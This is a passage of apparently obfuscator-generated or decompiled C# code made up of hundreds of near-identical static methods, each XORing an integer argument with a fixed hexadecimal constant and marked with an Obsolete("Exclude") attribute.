		return int_4 ^ 0x4C14365D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6581(int int_4)
	{
		return int_4 ^ 0x1AFD137F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6582(int int_4)
	{
		return int_4 ^ 0x6F064E75;
	}

	[Obsolete("Exclude")]
	public static int smethod_6583(int int_4)
	{
		return int_4 ^ 0x6F0602F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6584(int int_4)
	{
		return int_4 ^ 0x545FAE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6585(int int_4)
	{
		return int_4 ^ 0x885302D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6586(int int_4)
	{
		return int_4 ^ 0x69AF564C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6587(int int_4)
	{
		return int_4 ^ 0x52879724;
	}

	[Obsolete("Exclude")]
	public static int smethod_6588(int int_4)
	{
		return int_4 ^ 0x4AA995DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6589(int int_4)
	{
		return int_4 ^ 0x5F653598;
	}

	[Obsolete("Exclude")]
	public static int smethod_6590(int int_4)
	{
		return int_4 ^ 0x68D772C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6591(int int_4)
	{
		return int_4 ^ 0x6A14C26;
	}

	[Obsolete("Exclude")]
	public static int smethod_6592(int int_4)
	{
		return int_4 ^ 0x7FB4FC4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6593(int int_4)
	{
		return int_4 ^ 0x77D50B33;
	}

	[Obsolete("Exclude")]
	public static int smethod_6594(int int_4)
	{
		return int_4 ^ 0x6B223D42;
	}

	[Obsolete("Exclude")]
	public static int smethod_6595(int int_4)
	{
		return int_4 ^ 0x12BFA604;
	}

	[Obsolete("Exclude")]
	public static int smethod_6596(int int_4)
	{
		return int_4 ^ 0x104CE3C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6597(int int_4)
	{
		return int_4 ^ 0x7A9AF715;
	}

	[Obsolete("Exclude")]
	public static int smethod_6598(int int_4)
	{
		return int_4 ^ 0x4002D934;
	}

	[Obsolete("Exclude")]
	public static int smethod_6600(int int_4)
	{
		return int_4 ^ 0x378E4DD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6601(int int_4)
	{
		return int_4 ^ 0x3198AF4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6603(int int_4)
	{
		return int_4 ^ 0x7BD1F24D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6604(int int_4)
	{
		return int_4 ^ 0x41FAFC15;
	}

	[Obsolete("Exclude")]
	public static int smethod_6605(int int_4)
	{
		return int_4 ^ 0x7F4A5748;
	}

	[Obsolete("Exclude")]
	public static int smethod_6606(int int_4)
	{
		return int_4 ^ 0x19148496;
	}

	[Obsolete("Exclude")]
	public static int smethod_6607(int int_4)
	{
		return int_4 ^ 0x6807C7AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6608(int int_4)
	{
		return int_4 ^ 0x28946B5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6609(int int_4)
	{
		return int_4 ^ 0x644D032B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6610(int int_4)
	{
		return int_4 ^ 0x4CD7A40B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6611(int int_4)
	{
		return int_4 ^ 0x42821EF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6612(int int_4)
	{
		return int_4 ^ 0x5BD8516F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6613(int int_4)
	{
		return int_4 ^ 0x71CD81DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6614(int int_4)
	{
		return int_4 ^ 0x776F9001;
	}

	[Obsolete("Exclude")]
	public static int smethod_6616(int int_4)
	{
		return int_4 ^ 0x1CD8AF05;
	}

	[Obsolete("Exclude")]
	public static int smethod_6617(int int_4)
	{
		return int_4 ^ 0x23C3BA9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6618(int int_4)
	{
		return int_4 ^ 0x4ED968D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6619(int int_4)
	{
		return int_4 ^ 0x2D4CF2F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6620(int int_4)
	{
		return int_4 ^ 0x3208AE88;
	}

	[Obsolete("Exclude")]
	public static int smethod_6622(int int_4)
	{
		return int_4 ^ 0x12062232;
	}

	[Obsolete("Exclude")]
	public static int smethod_6623(int int_4)
	{
		return int_4 ^ 0x666CA72C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6624(int int_4)
	{
		return int_4 ^ 0x2A107B32;
	}

	[Obsolete("Exclude")]
	public static int smethod_6625(int int_4)
	{
		return int_4 ^ 0x29D59F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6626(int int_4)
	{
		return int_4 ^ 0x6D274847;
	}

	[Obsolete("Exclude")]
	public static int smethod_6627(int int_4)
	{
		return int_4 ^ 0x2BCCC9EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6628(int int_4)
	{
		return int_4 ^ 0x15F9C1C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6629(int int_4)
	{
		return int_4 ^ 0x2006E4FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6630(int int_4)
	{
		return int_4 ^ 0x3ADBF3FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6631(int int_4)
	{
		return int_4 ^ 0x7D87E6D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6633(int int_4)
	{
		return int_4 ^ 0x2B1401B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6634(int int_4)
	{
		return int_4 ^ 0x39E8B349;
	}

	[Obsolete("Exclude")]
	public static int smethod_6635(int int_4)
	{
		return int_4 ^ 0x1EE28813;
	}

	[Obsolete("Exclude")]
	public static int smethod_6636(int int_4)
	{
		return int_4 ^ 0x54443F50;
	}

	[Obsolete("Exclude")]
	public static int smethod_6637(int int_4)
	{
		return int_4 ^ 0x3E9A1DEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6638(int int_4)
	{
		return int_4 ^ 0x1E995D61;
	}

	[Obsolete("Exclude")]
	public static int smethod_6639(int int_4)
	{
		return int_4 ^ 0x16982E3F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6640(int int_4)
	{
		return int_4 ^ 0x4555064;
	}

	[Obsolete("Exclude")]
	public static int smethod_6641(int int_4)
	{
		return int_4 ^ 0x39880DD6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6642(int int_4)
	{
		return int_4 ^ 0x5298B08A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6643(int int_4)
	{
		return int_4 ^ 0x72A6205A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6644(int int_4)
	{
		return int_4 ^ 0x7178FF18;
	}

	[Obsolete("Exclude")]
	public static int smethod_6645(int int_4)
	{
		return int_4 ^ 0x5288E631;
	}

	[Obsolete("Exclude")]
	public static int smethod_6647(int int_4)
	{
		return int_4 ^ 0x5B720159;
	}

	[Obsolete("Exclude")]
	public static int smethod_6648(int int_4)
	{
		return int_4 ^ 0x399EF149;
	}

	[Obsolete("Exclude")]
	public static int smethod_6649(int int_4)
	{
		return int_4 ^ 0x3317512F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6650(int int_4)
	{
		return int_4 ^ 0x45DF082F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6651(int int_4)
	{
		return int_4 ^ 0x427196CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6653(int int_4)
	{
		return int_4 ^ 0x373CA627;
	}

	[Obsolete("Exclude")]
	public static int smethod_6654(int int_4)
	{
		return int_4 ^ 0x314594E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6656(int int_4)
	{
		return int_4 ^ 0x73C977A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6657(int int_4)
	{
		return int_4 ^ 0x4FDE0E5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6658(int int_4)
	{
		return int_4 ^ 0x159D9025;
	}

	[Obsolete("Exclude")]
	public static int smethod_6659(int int_4)
	{
		return int_4 ^ 0x27D7C1F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6660(int int_4)
	{
		return int_4 ^ 0x76C6E53E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6661(int int_4)
	{
		return int_4 ^ 0xF4BC14E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6662(int int_4)
	{
		return int_4 ^ 0xD05C3B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6663(int int_4)
	{
		return int_4 ^ 0x650E32B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6664(int int_4)
	{
		return int_4 ^ 0x67D6FE09;
	}

	[Obsolete("Exclude")]
	public static int smethod_6665(int int_4)
	{
		return int_4 ^ 0x10CB664B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6666(int int_4)
	{
		return int_4 ^ 0x39AB1E3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6667(int int_4)
	{
		return int_4 ^ 0x6C6372A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6670(int int_4)
	{
		return int_4 ^ 0x5C29E20D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6671(int int_4)
	{
		return int_4 ^ 0x472E6C35;
	}

	[Obsolete("Exclude")]
	public static int smethod_6672(int int_4)
	{
		return int_4 ^ 0xE86AEF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6673(int int_4)
	{
		return int_4 ^ 0x3F74BCAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6674(int int_4)
	{
		return int_4 ^ 0x2EBE8572;
	}

	[Obsolete("Exclude")]
	public static int smethod_6675(int int_4)
	{
		return int_4 ^ 0xD113BF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6676(int int_4)
	{
		return int_4 ^ 0xC193C44;
	}

	[Obsolete("Exclude")]
	public static int smethod_6677(int int_4)
	{
		return int_4 ^ 0x3FF31AAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6678(int int_4)
	{
		return int_4 ^ 0x31760898;
	}

	[Obsolete("Exclude")]
	public static int smethod_6679(int int_4)
	{
		return int_4 ^ 0x77DE7BE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6680(int int_4)
	{
		return int_4 ^ 0x1BABC698;
	}

	[Obsolete("Exclude")]
	public static int smethod_6681(int int_4)
	{
		return int_4 ^ 0x56A97C60;
	}

	[Obsolete("Exclude")]
	public static int smethod_6682(int int_4)
	{
		return int_4 ^ 0x3B7FC036;
	}

	[Obsolete("Exclude")]
	public static int smethod_6683(int int_4)
	{
		return int_4 ^ 0xE9B9E61;
	}

	[Obsolete("Exclude")]
	public static int smethod_6684(int int_4)
	{
		return int_4 ^ 0x48DBDACC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6685(int int_4)
	{
		return int_4 ^ 0x429B38D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6687(int int_4)
	{
		return int_4 ^ 0x7EEA1B6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6688(int int_4)
	{
		return int_4 ^ 0x6FD8B301;
	}

	[Obsolete("Exclude")]
	public static int smethod_6689(int int_4)
	{
		return int_4 ^ 0x521D1B76;
	}

	[Obsolete("Exclude")]
	public static int smethod_6690(int int_4)
	{
		return int_4 ^ 0x51C1799A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6691(int int_4)
	{
		return int_4 ^ 0x640C7FD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6692(int int_4)
	{
		return int_4 ^ 0x2F2A8F4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6693(int int_4)
	{
		return int_4 ^ 0x29C36106;
	}

	[Obsolete("Exclude")]
	public static int smethod_6694(int int_4)
	{
		return int_4 ^ 0x485A98DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6695(int int_4)
	{
		return int_4 ^ 0x132FC2CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6696(int int_4)
	{
		return int_4 ^ 0x545F1A62;
	}

	[Obsolete("Exclude")]
	public static int smethod_6698(int int_4)
	{
		return int_4 ^ 0x4996A4D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6699(int int_4)
	{
		return int_4 ^ 0x453F6638;
	}

	[Obsolete("Exclude")]
	public static int smethod_6700(int int_4)
	{
		return int_4 ^ 0x1009CCE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6701(int int_4)
	{
		return int_4 ^ 0x6C0ABC6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6702(int int_4)
	{
		return int_4 ^ 0x15CDB5ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_6703(int int_4)
	{
		return int_4 ^ 0x3936A408;
	}

	[Obsolete("Exclude")]
	public static int smethod_6704(int int_4)
	{
		return int_4 ^ 0x69A8F46E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6705(int int_4)
	{
		return int_4 ^ 0x1644A1F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6706(int int_4)
	{
		return int_4 ^ 0x2DC2CCD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6707(int int_4)
	{
		return int_4 ^ 0x7087DF9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6708(int int_4)
	{
		return int_4 ^ 0x6C7F1CB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6709(int int_4)
	{
		return int_4 ^ 0x7EF5AA5C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6711(int int_4)
	{
		return int_4 ^ 0xC3A21F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6712(int int_4)
	{
		return int_4 ^ 0x2E22AECC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6713(int int_4)
	{
		return int_4 ^ 0x7C2754A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6714(int int_4)
	{
		return int_4 ^ 0x4636C6E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6715(int int_4)
	{
		return int_4 ^ 0x6D6D45C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6716(int int_4)
	{
		return int_4 ^ 0x7589E10D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6717(int int_4)
	{
		return int_4 ^ 0x62204B4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6718(int int_4)
	{
		return int_4 ^ 0x3D70BB28;
	}

	[Obsolete("Exclude")]
	public static int smethod_6719(int int_4)
	{
		return int_4 ^ 0x2E273E4B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6720(int int_4)
	{
		return int_4 ^ 0x50E73D71;
	}

	[Obsolete("Exclude")]
	public static int smethod_6721(int int_4)
	{
		return int_4 ^ 0x25E979FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6722(int int_4)
	{
		return int_4 ^ 0x7BCF0578;
	}

	[Obsolete("Exclude")]
	public static int smethod_6723(int int_4)
	{
		return int_4 ^ 0x2568666D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6725(int int_4)
	{
		return int_4 ^ 0x464311E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6726(int int_4)
	{
		return int_4 ^ 0x255E9BB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6727(int int_4)
	{
		return int_4 ^ 0x5999953B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6728(int int_4)
	{
		return int_4 ^ 0x4633EE1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6730(int int_4)
	{
		return int_4 ^ 0x7C4D96D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6731(int int_4)
	{
		return int_4 ^ 0xCBF98CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6732(int int_4)
	{
		return int_4 ^ 0x483A51FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6733(int int_4)
	{
		return int_4 ^ 0x687003BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6734(int int_4)
	{
		return int_4 ^ 0xF4FA6D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6735(int int_4)
	{
		return int_4 ^ 0xC8A5FEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6736(int int_4)
	{
		return int_4 ^ 0x3285F525;
	}

	[Obsolete("Exclude")]
	public static int smethod_6737(int int_4)
	{
		return int_4 ^ 0x7B0EECE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6739(int int_4)
	{
		return int_4 ^ 0x37C17425;
	}

	[Obsolete("Exclude")]
	public static int smethod_6740(int int_4)
	{
		return int_4 ^ 0x4A635061;
	}

	[Obsolete("Exclude")]
	public static int smethod_6741(int int_4)
	{
		return int_4 ^ 0x5342C766;
	}

	[Obsolete("Exclude")]
	public static int smethod_6742(int int_4)
	{
		return int_4 ^ 0x94B6D53;
	}

	[Obsolete("Exclude")]
	public static int smethod_6744(int int_4)
	{
		return int_4 ^ 0x37420C4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6745(int int_4)
	{
		return int_4 ^ 0x119C04C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6746(int int_4)
	{
		return int_4 ^ 0x7461C113;
	}

	[Obsolete("Exclude")]
	public static int smethod_6747(int int_4)
	{
		return int_4 ^ 0x5B3022E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6748(int int_4)
	{
		return int_4 ^ 0x5A5E63C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6749(int int_4)
	{
		return int_4 ^ 0x481CAB82;
	}

	[Obsolete("Exclude")]
	public static int smethod_6750(int int_4)
	{
		return int_4 ^ 0x96A2C66;
	}

	[Obsolete("Exclude")]
	public static int smethod_6752(int int_4)
	{
		return int_4 ^ 0x69C9E471;
	}

	[Obsolete("Exclude")]
	public static int smethod_6753(int int_4)
	{
		return int_4 ^ 0x6F7C9686;
	}

	[Obsolete("Exclude")]
	public static int smethod_6754(int int_4)
	{
		return int_4 ^ 0x627B9C32;
	}

	[Obsolete("Exclude")]
	public static int smethod_6755(int int_4)
	{
		return int_4 ^ 0x871C599;
	}

	[Obsolete("Exclude")]
	public static int smethod_6756(int int_4)
	{
		return int_4 ^ 0x668CFF54;
	}

	[Obsolete("Exclude")]
	public static int smethod_6757(int int_4)
	{
		return int_4 ^ 0x752154BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6758(int int_4)
	{
		return int_4 ^ 0x4795849B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6759(int int_4)
	{
		return int_4 ^ 0x1CBF0F07;
	}

	[Obsolete("Exclude")]
	public static int smethod_6761(int int_4)
	{
		return int_4 ^ 0x3E2B52C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6762(int int_4)
	{
		return int_4 ^ 0x50D74F04;
	}

	[Obsolete("Exclude")]
	public static int smethod_6763(int int_4)
	{
		return int_4 ^ 0x6FB8B6B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6764(int int_4)
	{
		return int_4 ^ 0x3E2E5450;
	}

	[Obsolete("Exclude")]
	public static int smethod_6765(int int_4)
	{
		return int_4 ^ 0x71879BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6766(int int_4)
	{
		return int_4 ^ 0x670556E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6768(int int_4)
	{
		return int_4 ^ 0x6666C668;
	}

	[Obsolete("Exclude")]
	public static int smethod_6769(int int_4)
	{
		return int_4 ^ 0x46A8E2A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6771(int int_4)
	{
		return int_4 ^ 0x2629640E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6772(int int_4)
	{
		return int_4 ^ 0x27DCE9D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6773(int int_4)
	{
		return int_4 ^ 0x4E91FB5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6774(int int_4)
	{
		return int_4 ^ 0x73CBCC11;
	}

	[Obsolete("Exclude")]
	public static int smethod_6775(int int_4)
	{
		return int_4 ^ 0x4CA70449;
	}

	[Obsolete("Exclude")]
	public static int smethod_6776(int int_4)
	{
		return int_4 ^ 0x30335E97;
	}

	[Obsolete("Exclude")]
	public static int smethod_6777(int int_4)
	{
		return int_4 ^ 0x42024391;
	}

	[Obsolete("Exclude")]
	public static int smethod_6778(int int_4)
	{
		return int_4 ^ 0x5312061B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6779(int int_4)
	{
		return int_4 ^ 0x4949D55B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6782(int int_4)
	{
		return int_4 ^ 0x73661D78;
	}

	[Obsolete("Exclude")]
	public static int smethod_6783(int int_4)
	{
		return int_4 ^ 0x2037D6F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6785(int int_4)
	{
		return int_4 ^ 0x314B99B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6786(int int_4)
	{
		return int_4 ^ 0xAF9DF1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6787(int int_4)
	{
		return int_4 ^ 0x7D3CC5C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6789(int int_4)
	{
		return int_4 ^ 0x373E8A55;
	}

	[Obsolete("Exclude")]
	public static int smethod_6790(int int_4)
	{
		return int_4 ^ 0x430D37B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6791(int int_4)
	{
		return int_4 ^ 0xBEB5EF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6792(int int_4)
	{
		return int_4 ^ 0x35ABFBD2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6793(int int_4)
	{
		return int_4 ^ 0x2F9E9A57;
	}

	[Obsolete("Exclude")]
	public static int smethod_6794(int int_4)
	{
		return int_4 ^ 0x1D7BFDA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6795(int int_4)
	{
		return int_4 ^ 0x3BC92063;
	}

	[Obsolete("Exclude")]
	public static int smethod_6796(int int_4)
	{
		return int_4 ^ 0x6BAAB776;
	}

	[Obsolete("Exclude")]
	public static int smethod_6798(int int_4)
	{
		return int_4 ^ 0x12C7DFDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6799(int int_4)
	{
		return int_4 ^ 0x3B6C1B32;
	}

	[Obsolete("Exclude")]
	public static int smethod_6800(int int_4)
	{
		return int_4 ^ 0x6B296AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6802(int int_4)
	{
		return int_4 ^ 0x401B18FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6803(int int_4)
	{
		return int_4 ^ 0x42A6D789;
	}

	[Obsolete("Exclude")]
	public static int smethod_6804(int int_4)
	{
		return int_4 ^ 0x523FE900;
	}

	[Obsolete("Exclude")]
	public static int smethod_6805(int int_4)
	{
		return int_4 ^ 0x400E0B07;
	}

	[Obsolete("Exclude")]
	public static int smethod_6806(int int_4)
	{
		return int_4 ^ 0x61511AC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6807(int int_4)
	{
		return int_4 ^ 0x29A7B495;
	}

	[Obsolete("Exclude")]
	public static int smethod_6808(int int_4)
	{
		return int_4 ^ 0x12E5FD37;
	}

	[Obsolete("Exclude")]
	public static int smethod_6809(int int_4)
	{
		return int_4 ^ 0x6C1E0624;
	}

	[Obsolete("Exclude")]
	public static int smethod_6810(int int_4)
	{
		return int_4 ^ 0x55DCDC2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6811(int int_4)
	{
		return int_4 ^ 0x363DE4E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6812(int int_4)
	{
		return int_4 ^ 0x1882A87;
	}

	[Obsolete("Exclude")]
	public static int smethod_6813(int int_4)
	{
		return int_4 ^ 0xECE2AFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6814(int int_4)
	{
		return int_4 ^ 0x4AEAFBB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6816(int int_4)
	{
		return int_4 ^ 0x7FDE9409;
	}

	[Obsolete("Exclude")]
	public static int smethod_6817(int int_4)
	{
		return int_4 ^ 0xB2F82A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6818(int int_4)
	{
		return int_4 ^ 0x31AAF67;
	}

	[Obsolete("Exclude")]
	public static int smethod_6819(int int_4)
	{
		return int_4 ^ 0x76B29593;
	}

	[Obsolete("Exclude")]
	public static int smethod_6820(int int_4)
	{
		return int_4 ^ 0x116AF2EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6821(int int_4)
	{
		return int_4 ^ 0xF8FF821;
	}

	[Obsolete("Exclude")]
	public static int smethod_6822(int int_4)
	{
		return int_4 ^ 0x1FF19029;
	}

	[Obsolete("Exclude")]
	public static int smethod_6823(int int_4)
	{
		return int_4 ^ 0x2C398461;
	}

	[Obsolete("Exclude")]
	public static int smethod_6825(int int_4)
	{
		return int_4 ^ 0x190C6D37;
	}

	[Obsolete("Exclude")]
	public static int smethod_6827(int int_4)
	{
		return int_4 ^ 0x5A58DDF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6829(int int_4)
	{
		return int_4 ^ 0x64FE7C15;
	}

	[Obsolete("Exclude")]
	public static int smethod_6830(int int_4)
	{
		return int_4 ^ 0x72653B41;
	}

	[Obsolete("Exclude")]
	public static int smethod_6831(int int_4)
	{
		return int_4 ^ 0x59391B4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6832(int int_4)
	{
		return int_4 ^ 0x45BAA3EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6834(int int_4)
	{
		return int_4 ^ 0x794F8F2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6835(int int_4)
	{
		return int_4 ^ 0x15CFCA25;
	}

	[Obsolete("Exclude")]
	public static int smethod_6836(int int_4)
	{
		return int_4 ^ 0x2B440328;
	}

	[Obsolete("Exclude")]
	public static int smethod_6838(int int_4)
	{
		return int_4 ^ 0x62CFD8DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6839(int int_4)
	{
		return int_4 ^ 0x3285F3AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6840(int int_4)
	{
		return int_4 ^ 0x2985FA88;
	}

	[Obsolete("Exclude")]
	public static int smethod_6841(int int_4)
	{
		return int_4 ^ 0x2DCD133A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6842(int int_4)
	{
		return int_4 ^ 0x2B28CBB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6843(int int_4)
	{
		return int_4 ^ 0x7635E121;
	}

	[Obsolete("Exclude")]
	public static int smethod_6844(int int_4)
	{
		return int_4 ^ 0x2F88EB68;
	}

	[Obsolete("Exclude")]
	public static int smethod_6845(int int_4)
	{
		return int_4 ^ 0x21FC52F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6846(int int_4)
	{
		return int_4 ^ 0x6A60D5CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6847(int int_4)
	{
		return int_4 ^ 0x1A023D0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6848(int int_4)
	{
		return int_4 ^ 0x1942E5D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6849(int int_4)
	{
		return int_4 ^ 0x1E4E193D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6850(int int_4)
	{
		return int_4 ^ 0x1017E7DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6852(int int_4)
	{
		return int_4 ^ 0x3D8F70B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6854(int int_4)
	{
		return int_4 ^ 0x2D8F009;
	}

	[Obsolete("Exclude")]
	public static int smethod_6855(int int_4)
	{
		return int_4 ^ 0x28F4580A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6857(int int_4)
	{
		return int_4 ^ 0x34506D77;
	}

	[Obsolete("Exclude")]
	public static int smethod_6858(int int_4)
	{
		return int_4 ^ 0x3C53CBEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6859(int int_4)
	{
		return int_4 ^ 0x67CFF986;
	}

	[Obsolete("Exclude")]
	public static int smethod_6860(int int_4)
	{
		return int_4 ^ 0x18414ACF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6861(int int_4)
	{
		return int_4 ^ 0x5C5B1FBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6862(int int_4)
	{
		return int_4 ^ 0x1499786D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6863(int int_4)
	{
		return int_4 ^ 0x58FBC3DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6864(int int_4)
	{
		return int_4 ^ 0x26AEC665;
	}

	[Obsolete("Exclude")]
	public static int smethod_6865(int int_4)
	{
		return int_4 ^ 0x96F4CE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6866(int int_4)
	{
		return int_4 ^ 0x5BF12BB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6867(int int_4)
	{
		return int_4 ^ 0x695CA7B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6868(int int_4)
	{
		return int_4 ^ 0x66BD06CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6869(int int_4)
	{
		return int_4 ^ 0x244A856F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6871(int int_4)
	{
		return int_4 ^ 0x4E2A80DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6872(int int_4)
	{
		return int_4 ^ 0x13075129;
	}

	[Obsolete("Exclude")]
	public static int smethod_6873(int int_4)
	{
		return int_4 ^ 0x63C1C8F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6874(int int_4)
	{
		return int_4 ^ 0x2EC9901B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6875(int int_4)
	{
		return int_4 ^ 0x2A5799AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6876(int int_4)
	{
		return int_4 ^ 0x70A438AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6877(int int_4)
	{
		return int_4 ^ 0x265F0107;
	}

	[Obsolete("Exclude")]
